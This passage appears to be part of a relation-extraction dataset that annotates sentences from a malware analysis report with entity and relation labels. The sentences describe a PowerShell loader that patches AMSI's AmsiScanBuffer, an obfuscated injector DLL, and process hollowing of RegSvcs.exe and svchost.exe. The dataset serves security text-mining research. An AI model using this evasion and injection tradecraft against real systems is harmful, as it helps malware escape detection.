17], "name": "registry entry", "pos": [17, 19], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "PowerShell loader", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "loader", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "PowerShell process", "pos": [20, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "PowerShell code", "pos": [2, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "auxiliary", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "payloads", "pos": [11, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "payload", "pos": [12, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "payload", "pos": [19, 20], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [108, 108], "name": "RegSvcs.exe", "pos": [31, 32], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [110, 110], "name": "Killamsi.dll", "pos": [0, 1], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "DLL", "pos": [1, 2], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [148, 148], "name": "amsi.dll", "pos": [15, 16], "index": "12_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [161, 161], "name": "Amsi.dll", "pos": [0, 1], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "FR", "evidence": [2, 3, 4], "h": 3, "t": 9}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 4, "t": 7}, {"r": "FR", "evidence": [3, 4, 5], "h": 4, "t": 10}, {"r": "EX", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "CO", "evidence": [4], "t": 7, "h": 8}, {"r": "RD", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "EX", "evidence": [3, 4, 5], "t": 5, "h": 10}, {"r": "RD", "evidence": [5, 6, 7], "h": 10, "t": 13}, {"r": "RD", "evidence": [5, 6, 7], "h": 10, "t": 13}, {"r": "WR", "evidence": [5, 6, 7], "h": 10, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}]}, {"title": "05-14", "sents": [["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "PowerShell loader", "pos": [5, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [9, 9], "name": "loader", "pos": [1, 2], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "PowerShell process", "pos": [20, 22], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "PowerShell code", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "auxiliary", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "payloads", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "payload", "pos": [12, 13], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "payload", "pos": [19, 20], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [76, 76], "name": "RegSvcs.exe", "pos": [31, 32], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "Killamsi.dll", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "DLL", "pos": [1, 2], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [116, 116], "name": "amsi.dll", "pos": [15, 16], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [129, 129], "name": "Amsi.dll", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [149, 149], "name": "friday.dll", "pos": [9, 10], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [1, 2, 3], "h": 2, "t": 8}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 5}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "FR", "evidence": [2, 3, 4], "h": 3, "t": 9}, {"r": "EX", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "CO", "evidence": [3], "t": 6, "h": 7}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "EX", "evidence": [2, 3, 4], "t": 4, "h": 9}, {"r": "RD", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "RD", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [6, 7], "t": 12, "h": 13}, {"r": "WR", "evidence": [6, 7], "t": 12, "h": 13}]}, {"title": "05-15", "sents": [["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "loader", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "PowerShell process", "pos": [20, 22], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "PowerShell code", "pos": [2, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "auxiliary", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "payloads", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "payload", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "payload", "pos": [19, 20], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [68, 68], "name": "RegSvcs.exe", "pos": [31, 32], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [70, 70], "name": "Killamsi.dll", "pos": [0, 1], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [94, 94], "name": "DLL", "pos": [1, 2], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [108, 108], "name": "amsi.dll", "pos": [15, 16], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [121, 121], "name": "Amsi.dll", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "friday.dll", "pos": [9, 10], "index": "12_0"}]], "labels": [{"r": "FR", "evidence": [0, 1, 2], "h": 1, "t": 7}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 2, "t": 8}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "CO", "evidence": [2], "t": 5, "h": 6}, {"r": "RD", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "EX", "evidence": [1, 2, 3], "t": 3, "h": 8}, {"r": "RD", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "RD", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}]}, {"title": "05-16", "sents": [["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "PowerShell code", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "auxiliary", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "payloads", "pos": [11, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "payload", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "payload", "pos": [19, 20], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [44, 44], "name": "RegSvcs.exe", "pos": [31, 32], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "Killamsi.dll", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [70, 70], "name": "DLL", "pos": [1, 2], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [84, 84], "name": "amsi.dll", "pos": [15, 16], "index": "8_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [97, 97], "name": "Amsi.dll", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [117, 117], "name": "friday.dll", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [136, 136], "name": "It", "pos": [0, 1], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [140, 140], "name": "process", "pos": [4, 5], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [151, 151], "name": "RegSvcs.exe", "pos": [15, 16], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "CO", "evidence": [1], "t": 3, "h": 4}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "EX", "evidence": [0, 1, 2], "t": 1, "h": 6}, {"r": "RD", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "RD", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "WR", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "RD", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "WR", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "FR", "evidence": [7], "h": 11, "t": 12}, {"r": "EX", "evidence": [5, 6, 7], "t": 10, "h": 12}, {"r": "IJ", "evidence": [7], "h": 12, "t": 13}]}, {"title": "05-17", "sents": [["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "payload", "pos": [12, 13], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "payload", "pos": [19, 20], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [31, 31], "name": "RegSvcs.exe", "pos": [31, 32], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "Killamsi.dll", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "DLL", "pos": [1, 2], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [71, 71], "name": "amsi.dll", "pos": [15, 16], "index": "5_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [84, 84], "name": "Amsi.dll", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [104, 104], "name": "friday.dll", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [127, 127], "name": "process", "pos": [4, 5], "index": "9_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [138, 138], "name": "RegSvcs.exe", "pos": [15, 16], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [141, 141], "name": "Friday.dll", "pos": [0, 1], "index": "11_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [152, 152], "name": "RegSvcs.exe", "pos": [11, 12], "index": "12_0"}]], "labels": [{"r": "CO", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "FR", "evidence": [6], "h": 8, "t": 9}, {"r": "EX", "evidence": [4, 5, 6], "t": 7, "h": 9}, {"r": "IJ", "evidence": [6], "h": 9, "t": 10}, {"r": "RD", "evidence": [6, 7], "h": 10, "t": 11}, {"r": "WR", "evidence": [6, 7], "h": 10, "t": 11}, {"r": "EX", "evidence": [6, 7], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "t": 11, "h": 12}, {"r": "WR", "evidence": [7], "t": 11, "h": 12}]}, {"title": "05-18", "sents": [["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Killamsi.dll", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "DLL", "pos": [1, 2], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [38, 38], "name": "amsi.dll", "pos": [15, 16], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [51, 51], "name": "Amsi.dll", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "friday.dll", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [90, 90], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [94, 94], "name": "process", "pos": [4, 5], "index": "6_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [105, 105], "name": "RegSvcs.exe", "pos": [15, 16], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [108, 108], "name": "Friday.dll", "pos": [0, 1], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [119, 119], "name": "RegSvcs.exe", "pos": [11, 12], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "FR", "evidence": [5], "h": 5, "t": 6}, {"r": "EX", "evidence": [3, 4, 5], "t": 4, "h": 6}, {"r": "IJ", "evidence": [5], "h": 6, "t": 7}, {"r": "RD", "evidence": [5, 6], "h": 7, "t": 8}, {"r": "WR", "evidence": [5, 6], "h": 7, "t": 8}, {"r": "EX", "evidence": [5, 6], "h": 7, "t": 8}, {"r": "WR", "evidence": [6], "t": 8, "h": 9}, {"r": "WR", "evidence": [6], "t": 8, "h": 9}]}, {"title": "05-19", "sents": [["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "DLL", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [15, 15], "name": "amsi.dll", "pos": [15, 16], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [28, 28], "name": "Amsi.dll", "pos": [0, 1], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "friday.dll", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [67, 67], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "process", "pos": [4, 5], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [82, 82], "name": "RegSvcs.exe", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [85, 85], "name": "Friday.dll", "pos": [0, 1], "index": "7_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [96, 96], "name": "RegSvcs.exe", "pos": [11, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [108, 108], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [113, 113], "name": "svchost.exe", "pos": [5, 6], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "FR", "evidence": [4], "h": 4, "t": 5}, {"r": "EX", "evidence": [2, 3, 4], "t": 3, "h": 5}, {"r": "IJ", "evidence": [4], "h": 5, "t": 6}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "EX", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 5, "t": 10}, {"r": "WR", "evidence": [5], "t": 7, "h": 8}, {"r": "WR", "evidence": [5], "t": 7, "h": 8}, {"r": "FR", "evidence": [5, 6, 7], "h": 8, "t": 9}]}, {"title": "05-20", "sents": [["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [0, 0], "name": "Amsi.dll", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "friday.dll", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [39, 39], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [43, 43], "name": "process", "pos": [4, 5], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [54, 54], "name": "RegSvcs.exe", "pos": [15, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [57, 57], "name": "Friday.dll", "pos": [0, 1], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [68, 68], "name": "RegSvcs.exe", "pos": [11, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [80, 80], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [85, 85], "name": "svchost.exe", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [109, 109], "name": "svchost.exe", "pos": [4, 5], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "FR", "evidence": [3], "h": 2, "t": 3}, {"r": "EX", "evidence": [1, 2, 3], "t": 1, "h": 3}, {"r": "IJ", "evidence": [3], "h": 3, "t": 4}, {"r": "RD", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "WR", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "EX", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 3, "t": 8}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 3, "t": 9}, {"r": "WR", "evidence": [4], "t": 5, "h": 6}, {"r": "WR", "evidence": [4], "t": 5, "h": 6}, {"r": "FR", "evidence": [4, 5, 6], "h": 6, "t": 7}]}, {"title": "05-21", "sents": [["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "friday.dll", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "It", "pos": [0, 1], "index": 